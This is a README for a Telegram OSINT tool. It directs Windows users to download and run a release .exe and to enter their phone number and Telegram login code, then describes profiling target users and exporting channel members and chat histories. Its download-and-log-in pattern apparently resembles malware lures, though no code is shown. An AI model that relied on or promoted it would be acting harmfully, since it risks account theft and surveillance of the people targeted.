# 🔍 telegram_osint - Gather profile data and analyze chats

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Profane-aeliusdonatus171/telegram_osint/releases)

This application helps you collect and organize information from Telegram. It works through a terminal interface. You can track user profiles, scan channel activity, list group members, and search chat history. The tool saves your research in standard formats like JSON, CSV, and Markdown.

## 🛠 Prerequisites

You need a Windows computer to run this tool. Ensure you have a stable internet connection. You must have a Telegram account to access the required data. The software requires basic access to your local folders to export your findings. No coding knowledge is required.

## 📥 Getting Started

1. Visit the [official release page](https://github.com/Profane-aeliusdonatus171/telegram_osint/releases) to download the software.
2. Look for the file ending in `.exe` under the latest release section.
3. Click the file to start the download.
4. Save the file in a folder you can access easily, such as your Documents or Downloads folder.
5. Double-click the downloaded file to open the program.
6. A terminal window will appear. This window serves as the control panel for the application.

## ⚙️ Initial Configuration

The first time you run the tool, it needs to link to your Telegram account. 

1. Follow the text prompts in the terminal window.
2. Enter your phone number when requested.
3. Wait for the confirmation code from Telegram.
4. Type the code back into the terminal window.
5. The tool will generate a session file. This file allows the application to stay authenticated so you do not have to sign in every time you use it.

## 🔎 Analyzing Telegram Data

The tool uses a menu-based system. Use your keyboard to select the task you wish to perform.

### Profile Research
Select the profile research option to get information about a specific user. You will need to provide the username of the target. The tool pulls data such as user IDs, bio text, and member status. It saves this information as a text file for your records.

### Channel Analysis
Choose the channel analysis tool for group or channel data. Input the URL or username of the channel. The program counts members and scans recent messages. This helps you understand the activity levels within the group.

### Chat Search
The search function looks through your existing chats. Define keywords or specific time frames. The tool returns a list of matching messages. You can choose to export these results into a spreadsheet file for easier reading.

## 💾 Saving Your Work

The application creates a directory named `data` in the same location as the file you ran. All exports land in this folder. You will find sub-folders labeled by the date and time of your search. Use these files to share your findings or keep them for future reference.

## 🛡 Security and Privacy

This tool runs locally on your computer. Your account information stays inside the session file on your hard drive. The developers do not receive your messages or your contact list. Exercise caution when you scan public groups. If you want to stop using the tool, simply delete the folder containing the application and the local session files.

## 📈 Troubleshooting

If the program closes unexpectedly, check your internet connection first. Ensure you have not reached your daily rate limit on Telegram. A rate limit occurs when you perform too many searches in a short window of time. If this happens, wait an hour and try the command again. 

If the program prompts you for an API ID, you may need to visit the Telegram developer portal. Create an account, register an application, and paste the provided codes into the setup prompt. Most standard users will not need to perform this step, but it ensures higher speed for heavy usage.

## 📁 File Types

- **JSON:** Best for developers who need to move data to another program.
- **CSV:** Use these files to open data in Excel or Google Sheets. This format works best for lists and membership counts.
- **Markdown:** Use these files if you want to create clean, readable reports for documentation.

## 📝 Usage Best Practices

Start with small searches to understand how the tools return data. Building a large archive of chat data takes time depending on your connection speed. Keep your downloaded release file in a dedicated folder to avoid cluttering your desktop. Run the application as a standard user. You do not need to grant administrator permissions for the software to function correctly. If you need to update, simply visit the release page again and replace your old file with the new version.